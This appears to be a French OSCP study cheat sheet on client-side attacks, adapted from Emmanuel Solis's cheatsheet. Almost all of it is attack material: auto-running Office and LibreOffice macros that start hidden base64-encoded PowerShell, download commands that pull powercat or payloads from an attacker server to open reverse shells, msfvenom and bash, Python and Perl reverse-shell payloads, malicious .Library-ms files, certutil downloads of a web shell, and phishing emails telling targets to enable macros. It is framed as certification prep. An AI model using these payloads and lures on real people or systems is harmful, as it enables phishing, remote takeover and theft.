---
title: "OSCP · Attaques côté client"
description: "Comprendre les vecteurs d'interaction avec les postes utilisateurs."
---

# OSCP · Attaques côté client

Comprendre les vecteurs d'interaction avec les postes utilisateurs.


## MACROS




```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub

```


```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "[Your PowerShell Command]"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub

```




```powershell
IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powercat.ps1]');powercat -c [attacker-ip] -p [port] -e powershell

```


<p class="oscp-command-note">Script PowerShell dans la rubrique « MACROS ».</p>

```powershell
$text = "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text))
Write-Output $encoded

```


<p class="oscp-command-note">Script Python lié à « MACROS ».</p>

```python
cmd_str = "[Your Base64 Encoded PowerShell Command]"

chunk_size = 50

for i in range(0, len(cmd_str), chunk_size):
    print(f'Str = Str + "{cmd_str[i:i+chunk_size]}"')

```




```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim encodedCmd As String

    encodedCmd = encodedCmd + "[Base64 Chunk 1]"
    encodedCmd = encodedCmd + "[Base64 Chunk 2]"
    encodedCmd = encodedCmd + "..."
    encodedCmd = encodedCmd + "[Base64 Chunk N]"

    CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " & encodedCmd
End Sub

```


## Fichiers de bibliothèque Windows

Observer les permissions et la configuration de Windows.




```bash
wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/

```


<p class="oscp-command-note">Exécuter un script PowerShell.</p>

```powershell
# Créez le fichier comme un raccourci dans le système Windows pour préparer l'attaque
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"

```


**Paramètres et repères :**
`.Library-ms`  


<p class="oscp-command-note">Extrait XML lié à « Windows Library Files ».</p>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>[http://your-server]</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>

```


## Avancé Exploitation




```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "powe" & "rshe" & "ll.exe"
    cmdStr = cmdStr & " -nop -w hidden -enc " & "[Base64 Encoded Command]"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub

```


```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "cmd.exe /c ""powershell.exe -nop -w hidden -enc " & "[Base64 Encoded Command]" & """"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub

```


<p class="oscp-command-note">Script PowerShell dans la rubrique « Avancé Exploitation ».</p>

```powershell
# Utilisation des encodages
$text = "[Your PowerShell Command]"
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
Write-Output $encoded

# Altering PowerShell Execution Policies
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand [Your Base64 Encoded Command]

```


```html
<script>
    var cmd = "[Your JavaScript Command]";
    eval(cmd);
</script>

```


<p class="oscp-command-note">Extrait JavaScript lié à « Avancé Exploitation ».</p>

```javascript
var cmd = "";
cmd += "var shell = new ActiveXObject('WScript.Shell');";
cmd += "shell.Run('cmd.exe /c powershell.exe -nop -w hidden -enc [Base64 Encoded Command]');";
eval(cmd);

```


<p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>

```powershell
net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]

```


### Courriel simple


<p class="oscp-command-note">Examiner la configuration SMTP.</p>

```bash
sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header "Subject: [email-subject]" --suppress-data

```


**Paramètres et repères :**
`-t` · `--from` · `--attach` · `--server`  
`--body` · `--header` · `--suppress-data`  


### Courriel avec authentification


<p class="oscp-command-note">Examiner la configuration SMTP.</p>

```bash
sudo swaks -t <recipient@example.com> --from <sender@example.com> \
--attach config.Library-ms --server <SMTP_SERVER> --body body.txt \
--header "Subject: Problems" --suppress-data \
--auth LOGIN --auth-user <username> --auth-password <password>

```




```text
--auth LOGIN

```


**Paramètres et repères :**
`--auth-user` · `--auth-password`  


### Email avec des en-têtes personnalisés pour le génie social


<p class="oscp-command-note">Examiner la configuration SMTP.</p>

```bash
sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header "X-Priority: 1 (Highest)" --header "Importance: High" --suppress-data

```


**Paramètres et repères :**
`X-Priority` · `Importance`  


### Autre outil envoyer un courriel




```bash
sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
-u '[subject]' -m '[message]' -a '[attachment]'

```


**Paramètres et repères :**
`sendemail` · `-f` · `-t` · `-s`  
`192.168.203.140:25` · `-u` · `-m` · `-a`  


### Comparison Summary


**Authentification**

No · Yes · No · No


**En-têtes personnalisés**

Subject only · Subject only · Multiple (e.g., Priority, Importance) · Subject only


**SMTP Authentification**

No · Yes · No · No


**Social Engineering Usage**

No · No · Yes (with custom headers) · No


**Tool Complexity**

Moderate · Moderate · Moderate · Simple


### Cibles Linux

Examiner les permissions et la configuration de Linux.


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh

# Alternatively, use msfvenom to create an ELF payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf

# Si la machine cible permet aux scripts Bash d'exécuter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f bash -o payload.sh

# Utile si Python est disponible sur la cible
msfvenom -p python/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw -o payload.py

# Autre Python Inverser la charge utile de Shell
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("<your_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > shell.py

# Charge utile alternative Perl Reverse Shell
echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' > shell.pl

```




```text
-f elf

```




```text
-o shell.elf

```


**Paramètres et repères :**
`shell.elf`  




```text
Sub RunShell
    Shell("/bin/bash -c 'wget http://<your_ip>/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh'")
End Sub

- Shell: Executes the Bash command.  
- wget: Downloads the payload from your web server.  
- chmod +x: Makes the script executable.  
- /tmp/shell.sh: Runs the script from /tmp.

```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
python3 -m http.server 80

```


**Paramètres et repères :**
`update.odt`  


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -lvnp 4444

```


**Paramètres et repères :**
`swaks`  


<p class="oscp-command-note">Examiner la configuration SMTP.</p>

```bash
swaks --to target@example.com --from emmanuel@example.com \
--server smtp.example.com:587 --auth LOGIN \
--auth-user emmanuel@example.com --auth-password 'your_password' \
--attach update.odt --header "Subject: Important Update" \
--body "Hello,\n\nPlease find the attached document and enable macros to view the content.\n\nBest regards,\nEmmanuel"

# Execution Flow:
# 1. La cible ouvre le document LibreOffice.
# 2. Lorsque la cible permet des macros, la charge utile est téléchargée et exécutée.
# 3. A reverse shell connects to your Netcat listener.

```


### Cibles Windows

Observer les permissions et la configuration de Windows.


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta

```




```text
-f hta-psh

```




```text
-o evil.hta

```


**Paramètres et repères :**
`evil.hta` · `.hta` · `msfvenom` · `ps1`  
`exe`  




```text
-f exe -o evil.exe

```


**Paramètres et repères :**
`vbs`  




```text
-f vbs -o evil.vbs

```


**Paramètres et repères :**
`ps1`  




```text
-f ps1 -o script.ps1

```


**Paramètres et repères :**
`dll`  




```text
-f dll -o payload.dll

```


**Paramètres et repères :**
`evil.hta`  


<p class="oscp-command-note">Script Python lié à « Cibles Windows ».</p>

```python
# script Python pour diviser la charge utile en morceaux de 50 caractères
s = "<PASTE_PAYLOAD_HERE>"  # Replace with your payload string
n = 50  # Chunk size

for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')

```


**Paramètres et repères :**
`exploit.ods` · `Tools` · `Options` · `LibreOffice`  
`Security`  




```text
Macro Security

```


**Paramètres et repères :**
`Tools` · `Macros`  




```text
Organize Macros

```




```text
LibreOffice Basic

```


**Paramètres et repères :**
`Exploit`  




```text
REM ***** BASIC *****
Sub Exploit
    Dim Str As String
    ' Add payload chunks here
    Str = Str + "powershell.exe -nop -w hidden -e "
    Str = Str + "<INSERT_YOUR_PAYLOAD_CHUNKS>"
    
    ' Execute the payload using Shell
    Shell Str, 1
End Sub

```




```text
<INSERT_YOUR_PAYLOAD_CHUNKS>

```


**Paramètres et repères :**
`-nop`  




```text
-w hidden

```


**Paramètres et repères :**
`Shell`  




```text
Shell Str, 1

```


```text
Shell(Str)

```


```text
Shell Str, 1

```


**Paramètres et repères :**
`Shell`  


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -lvnp 444

```


<p class="oscp-command-note">Examiner la configuration SMTP.</p>

```bash
swaks --to target@example.com --from emmanuel@example.com \
--server smtp.example.com:587 --auth LOGIN \
--auth-user emmanuel@example.com --auth-password 'your_password' \
--attach evil.hta --header "Subject: Important Document" \
--body "Hi,\n\nPlease find the attached document.\n\nBest regards,\nEmmanuel"

```


**Paramètres et repères :**
`exploit.ods`  


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

```


<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>

```bash
systeminfo
whoami
ipconfig /all

```


<p class="oscp-command-note">Changer de répertoire.</p>

```text
cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe && certutil -urlcache -split -f http://[attacker_ip]/shell.pHp

```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
